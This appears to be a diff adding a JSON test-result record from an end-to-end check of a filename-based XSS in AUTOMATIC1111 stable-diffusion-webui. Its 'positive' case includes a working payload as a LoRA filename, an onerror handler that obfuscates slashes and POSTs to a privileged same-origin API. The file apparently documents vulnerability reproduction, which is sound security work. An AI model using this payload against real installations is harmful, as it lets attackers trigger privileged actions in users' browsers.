@@ -1,0 +1,43 @@
+{
+  "drive_method": "playwright",
+  "negative": {
+    "dom_markers": [],
+    "lora_file_sha256": {
+      "benign_lora.safetensors": "ea3128f9882454300b3b6f81bf70aec8f91cf181f9c45ecc834a648af33d4570"
+    },
+    "lora_files": [
+      "benign_lora.safetensors"
+    ],
+    "option_after": "",
+    "option_before": "",
+    "option_rewritten_by_page": false,
+    "phase": "neg",
+    "product_reachable": true
+  },
+  "positive": {
+    "dom_markers": [
+      "W200"
+    ],
+    "lora_file_sha256": {
+      "x\"><img src=x onerror='var s=String.fromCharCode(47);fetch(s+\"sdapi\"+s+\"v1\"+s+\"refresh-checkpoints\",{method:\"POST\"}).then(r=>document.documentElement.dataset.mbe2e=\"W\"+r.status)'>.safetensors": "aaacf851beafd7b901ca9bf9fd7f17deb2d0c0edf0dc853566d8dd3bd3a8623d"
+    },
+    "lora_files": [
+      "x\"><img src=x onerror='var s=String.fromCharCode(47);fetch(s+\"sdapi\"+s+\"v1\"+s+\"refresh-checkpoints\",{method:\"POST\"}).then(r=>document.documentElement.dataset.mbe2e=\"W\"+r.status)'>.safetensors"
+    ],
+    "option_after": "",
+    "option_before": "",
+    "option_rewritten_by_page": false,
+    "phase": "pos",
+    "product_reachable": true
+  },
+  "privileged_api_call": "POST /sdapi/v1/refresh-checkpoints from the page origin; the DOM marker carries the HTTP status the product returned",
+  "privileged_same_origin_api_effect": true,
+  "product": "AUTOMATIC1111/stable-diffusion-webui",
+  "product_commit": "82a973c04367123ae98bd9abdf80d9eda9b910e2",
+  "product_commit_verified": "1",
+  "root_key": "a1111.extra_networks_filename_xss",
+  "sink_effect": "browser_token",
+  "source_tree_sha256": "efbfdbe81a316f2e0758da403e8bb3e24dcd85c560bf369943372df936244905",
+  "verdict": "E2_product_e2e",
+  "xss_executed_in_origin": true
+}
